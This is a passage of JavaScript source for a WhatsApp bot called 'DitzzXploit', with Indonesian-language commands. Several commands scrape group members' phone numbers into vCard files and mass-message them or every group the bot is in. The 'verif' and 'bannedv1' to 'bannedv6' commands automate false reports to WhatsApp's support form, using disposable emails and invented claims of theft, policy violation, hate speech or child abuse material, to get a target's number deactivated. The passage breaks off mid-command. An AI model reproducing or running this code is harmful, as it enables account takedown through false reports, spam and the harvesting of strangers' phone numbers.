ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case 'premlist':{
if (!isOwner) return reply(mess.owner)
let listprem =`*LIST SELER Pedia Official*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem 628xxx/@tag`
DitzzXploit.sendMessage(m.chat, {text: listprem },{quoted: DitzzXploit.chat})
}
break
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await DitzzXploit.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await DitzzXploit.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case "listgroup":{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
let getGroups = await DitzzXploit.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await DitzzXploit.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case "pushkontakv1":{
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await DitzzXploit.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await DitzzXploit.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await DitzzXploit.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await DitzzXploit.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await DitzzXploit.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await DitzzXploit.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await DitzzXploit.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await DitzzXploit.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv3":
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !isGroup? await DitzzXploit.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await DitzzXploit.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await DitzzXploit.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
break
case "pushkontakv4":
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await DitzzXploit.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await DitzzXploit.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break
case "savecontactv1": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!text) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = isGroup? await DitzzXploit.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await DitzzXploit.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak':
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
huhuhs = await DitzzXploit.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
DitzzXploit.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
let cmiggc = await DitzzXploit.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
DitzzXploit.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!isGroup) return m.reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
DitzzXploit.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !isGroup? await DitzzXploit.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await DitzzXploit.sendMessage(from, { document: fs.readFileSync("./data/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'bcvideo': case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
        if (!q) return reply(`*Enter Text*`)
        let getGroups = await DitzzXploit.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(`\`\`\`Broadcasting in\`\`\` *${xeoncast.length}* \`\`\`Group Chat, in\`\`\` *${xeoncast.length * 1.5} seconds*`)
        for (let i of xeoncast) {
let txt = `*${global.ownerName}'s Broadcast*\n\n\`\`\`Message :\`\`\` *${q}*`
if(/image/.test(mime)) {
let media = await quoted.download()
await DitzzXploit.sendMessage(i, { image:media,  caption: txt })
}
if(/video/.test(mime)){
let media = await quoted.download()
await DitzzXploit.sendMessage(i, { video:media,  caption: txt })
}
            }
        reply(`\`\`\`Successfuly Broadcasted in\`\`\` *${xeoncast.length} Groups*`)      
        break
case 'remini':
			case 'hd': {
			if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (!quoted) return reply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			DitzzXploit.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(5000)
			}
			break
case 'enc': {
            if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break
case 'bcgc': case 'bcgroup': {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} RafatharOffcial`
let getGroups = await DitzzXploit.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
DitzzXploit.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case "jpm": case "jpm2":{
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await DitzzXploit.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await DitzzXploit.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await DitzzXploit.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await DitzzXploit.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN Rioo✅*")
}
break
case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DitzzXploit.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
